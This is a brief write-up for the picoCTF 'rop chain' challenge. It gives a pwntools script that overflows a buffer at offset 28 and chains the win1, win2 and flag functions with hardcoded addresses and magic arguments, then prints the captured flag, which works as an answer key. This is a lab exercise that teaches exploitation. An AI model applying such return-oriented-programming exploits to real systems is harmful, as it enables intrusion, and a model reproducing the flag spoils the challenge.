> rop chain - Points: 350 - (Solves: 127)
> Can you exploit the following program and get the flag? You can findi the program in /problems/rop-chain_0_6cdbecac1c3aa2316425c7d44e6ddf9d on the shell server? Source.

<TODO>
```
from pwn import *

p = process("/problems/rop-chain_0_6cdbecac1c3aa2316425c7d44e6ddf9d/rop")

offset = 28
win1_add = 0x080485CB
win2_add = 0x080485D8
win2_arg = 0xBAAAAAAD
flag = 0x0804862B
flag_arg = 0xDEADBAAD

payload = 'A' * offset + p32(win1_add) + p32(win2_add) + p32(flag) + p32(win2_arg) + p32(flag_arg)

p.sendline(payload)
p.interactive()
```


Flag: `picoCTF{rOp_aInT_5o_h4Rd_R1gHt_536d67d1}`
